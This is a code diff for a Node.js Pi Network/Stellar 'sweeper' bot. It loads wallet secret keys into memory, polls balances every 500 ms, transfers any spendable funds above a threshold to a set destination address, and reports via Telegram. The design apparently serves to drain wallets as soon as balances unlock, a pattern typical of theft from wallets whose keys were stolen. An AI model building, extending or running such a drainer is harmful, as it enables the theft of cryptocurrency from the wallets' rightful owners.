@@ -1,3 +1,78 @@
+'use strict';
+
+const StellarSdk = require('@stellar/stellar-sdk');
+
+const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://api.mainnet.minepi.com';
+const NETWORK_PASSPHRASE = process.env.STELLAR_NETWORK_PASSPHRASE || 'Pi Network';
+const DESTINATION = process.env.SWEEP_DESTINATION_ADDRESS || '';
+const POLL_INTERVAL_MS = Math.max(10, Number(process.env.SWEEP_POLL_INTERVAL_MS || 500));
+const MIN_THRESHOLD = Number(process.env.SWEEP_MIN_THRESHOLD || 0.002);
+
+const server = new StellarSdk.Horizon.Server(HORIZON_URL);
+const walletLocks = new Set();
+let monitorRunning = false;
+let monitorTimeoutId = null;
+
+const liveWalletsMap = new Map();
+const transactionHistory = [];
+
+function getErrorDetails(error) {
+  if (error?.response?.data?.extras?.result_codes) {
+    return JSON.stringify(error.response.data.extras.result_codes);
+  }
+  return error?.response?.data?.title || error?.message || String(error);
+}
+
+function log(level, message, details) {
+  const timestamp = new Date().toISOString();
+  console.log(`[${timestamp}] [Sweeper ${level}] ${message}`, details || '');
+}
+
+function initDatabase() {
+  log('INFO', 'In-memory transaction registry initialized successfully.');
+  return {
+    logTransaction(record) {
+      transactionHistory.push(record);
+      if (transactionHistory.length > 500) transactionHistory.shift();
+    }
+  };
+}
+
+const WalletManager = {
+  addLiveWallet({ id, publicKey, secretKey, label, chatId, customAmount }) {
+    liveWalletsMap.set(String(id), { 
+      id, 
+      publicKey, 
+      public_key: publicKey, 
+      secretKey, 
+      secret_key: secretKey, 
+      label, 
+      chatId,
+      chat_id: chatId,       
+      customAmount: customAmount ? Number(customAmount) : null 
+    });
+    log('INFO', `Wallet Box #${id} loaded successfully into volatile system memory.`);
+  },
+  
+  removeLiveWallet(id) {
+    return liveWalletsMap.delete(String(id));
+  },
+
+  getLiveWallets() {
+    return Array.from(liveWalletsMap.values());
+  }
+};
+
+async function notifyTelegram(bot, chatId, message) {
+  if (!bot || !chatId) return;
+  try {
+    await bot.sendMessage(chatId, message, { parse_mode: 'HTML', disable_web_page_preview: true });
+  } catch (error) {
+    log('ERROR', 'Telegram notification dispatch failed', error.message);
+  }
+}
+
+const SweeperEngine = {
   async evaluateBalance(publicKey) {
     try {
       const account = await server.loadAccount(publicKey);
@@ -5,8 +80,6 @@
       if (!native) return { spendable: 0, verified: false, total: 0 };
 
       const ledgerTotal = Number(native.balance || 0);
-      
-      // Check for any locked balance fields returned by Pi/Stellar horizon nodes
       let locked = 0;
       if (Object.prototype.hasOwnProperty.call(native, 'locked_balance')) {
         locked = Number(native.locked_balance || 0);
@@ -14,7 +87,6 @@
         locked = Number(account.locked_balance || 0);
       }
 
-      // Available spendable balance = Total ledger balance minus locked balance
       const spendable = Math.max(0, ledgerTotal - locked);
       return { spendable, verified: true, total: ledgerTotal };
     } catch (error) {
@@ -40,7 +112,6 @@
 
       const evalResult = await this.evaluateBalance(pubKey);
 
-      // If no spendable funds or below minimum threshold (0.02 Pi), keep watching
       if (!evalResult.verified || evalResult.spendable <= MIN_THRESHOLD) {
         return { status: 'NO_SWEEPABLE_FUNDS' };
       }
@@ -54,9 +125,6 @@
           return { status: 'BELOW_FIXED_TARGET' };
         }
       } else {
-        // Advanced Tiered Logic matching your exact rules:
-        // - If balance is > 1 Pi, leave 1 Pi behind and sweep the rest
-        // - If balance is between 0.02 and 1 Pi, leave 0.02 Pi behind and sweep the rest
         if (evalResult.spendable > 1.0) {
           targetAmount = evalResult.spendable - 1.0;
         } else if (evalResult.spendable > 0.02) {
@@ -114,3 +182,30 @@
       walletLocks.delete(id);
     }
   }
+};
+
+function startSweeperEngine(db, bot) {
+  if (monitorRunning) return;
+  monitorRunning = true;
+
+  const corePollingCycle = async () => {
+    if (!monitorRunning) return;
+    try {
+      const wallets = WalletManager.getLiveWallets();
+      for (const wallet of wallets) {
+        await SweeperEngine.executeInstantSweep(db, bot, wallet);
+      }
+    } catch (err) {
+      log('ERROR', 'Polling loop track exception', err.message);
+    }
+    if (monitorRunning) monitorTimeoutId = setTimeout(corePollingCycle, POLL_INTERVAL_MS);
+  };
+  corePollingCycle();
+}
+
+function stopSweeperEngine() {
+  monitorRunning = false;
+  if (monitorTimeoutId) clearTimeout(monitorTimeoutId);
+}
+
+module.exports = { initDatabase, WalletManager, startSweeperEngine, stopSweeperEngine, notifyTelegram };
